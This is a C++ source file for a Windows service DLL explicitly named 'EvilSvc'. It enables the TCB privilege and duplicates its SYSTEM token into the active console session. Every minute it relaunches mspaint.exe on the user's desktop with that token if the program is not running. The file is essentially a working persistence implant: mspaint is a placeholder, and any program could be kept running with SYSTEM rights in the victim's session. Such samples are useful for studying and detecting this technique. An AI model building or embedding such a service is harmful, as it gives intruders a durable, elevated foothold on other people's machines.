#include "pch.h"
#include "windows.h"
#include "tlhelp32.h"
#include "WtsApi32.h"
#include "UserEnv.h"
#include <sstream>

#include "dllmain.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "UserEnv.lib")

#define SVCNAME TEXT("EvilSvc")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

bool EnablePrivilegeEx(HANDLE process, const wchar_t* name, bool enable) 
{
    LUID luid;
    HANDLE token;
    TOKEN_PRIVILEGES privileges;
    DWORD returnLength;

    if (LookupPrivilegeValueW(NULL, name, &luid)) 
    {
        if (OpenProcessToken(process, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token))
        {
            privileges.PrivilegeCount = 1;
            privileges.Privileges[0].Luid = luid;
            if (enable)
                privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            else
                privileges.Privileges[0].Attributes = 0;
            AdjustTokenPrivileges(token, false, &privileges, sizeof(TOKEN_PRIVILEGES), &privileges, &returnLength);
            if (GetLastError() == ERROR_SUCCESS) {
                CloseHandle(token);
                return true;
            }
            return false;
        }
    }
    return false;
}


bool EnablePrivilege(const wchar_t* name,bool enable)
{
    return EnablePrivilegeEx(GetCurrentProcess(), name, enable);
}


TFuncRes StartAppWithAR(LPTSTR processName)
{
    TFuncRes result;

    DWORD dwSessionId, returnLength, oldSize;
    HANDLE hToken, systemToken;
    LPVOID pEnv;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    result.rs = 0;
    result.lasterror = 0;

    wchar_t RESULT[] = L"WINSTA0\\DEFAULT";
    hToken = INVALID_HANDLE_VALUE;
    oldSize = 0;
    
    dwSessionId = WTSGetActiveConsoleSessionId();
    if (!EnablePrivilege(SE_TCB_NAME, true))
    {
        result.rs = 5002;
        result.lasterror = GetLastError();
        return result;
    }
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &systemToken))
    {
        result.rs = 5005;
        result.lasterror = GetLastError();
        CloseHandle(hToken);
        return result;
    }
    if (!DuplicateTokenEx(systemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken))
    {
        result.rs = 5006;
        result.lasterror = GetLastError();
        CloseHandle(hToken);
        CloseHandle(systemToken);
        return result;
    }
    CloseHandle(systemToken);
    if (!SetTokenInformation(hToken, TokenSessionId, &dwSessionId, sizeof(DWORD)))
    {
        result.rs = 5007;
        result.lasterror = GetLastError();
        CloseHandle(hToken);
        return result;
    }
    if (!CreateEnvironmentBlock(&pEnv, hToken, false))
    {
        result.rs = 5008;
        result.lasterror = GetLastError();
        CloseHandle(hToken);
        return result;
    }
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    //si.wShowWindow=SW_HIDE;
    si.lpDesktop = RESULT;
    if (CreateProcessAsUserW(hToken, processName, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    else
    {
        result.lasterror = GetLastError();
        result.rs = 5009;
    }
    DestroyEnvironmentBlock(pEnv);
    return result;
}


static bool isProcessRun(LPTSTR processName)
{
    HANDLE hSnap = NULL;
    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnap != NULL)
    {
        if (Process32First(hSnap, &pe32))
        {
            if (lstrcmp(pe32.szExeFile, processName) == 0)
                return 1;
            while (Process32Next(hSnap, &pe32)) {
                if (lstrcmp(pe32.szExeFile, processName) == 0)
                    return 1;
            }
        }
        CloseHandle(hSnap);
    }
    return 0;
}


VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}


DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        serviceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }

    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    return NO_ERROR;
}


VOID ExecuteServiceCode()
{
    TFuncRes res;
    DWORD retValue;
    wchar_t fileName[] = L"mspaint.exe";

    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    while (1)
    {
        retValue = WaitForSingleObject(stopEvent, 60000);
        if (retValue == WAIT_TIMEOUT)
        {
            if (!isProcessRun(fileName))
            {
                res = StartAppWithAR(fileName);
            }
        }
        else
        {
            UpdateServiceStatus(SERVICE_STOPPED);
        }
    }
}


VOID WINAPI ServiceLalaMain(DWORD argC, LPWSTR* argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_STOP;
    serviceStatus.dwWin32ExitCode = NULL;
    serviceStatus.dwCheckPoint = 1000000;
    serviceStatus.dwWaitHint = 6000000;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}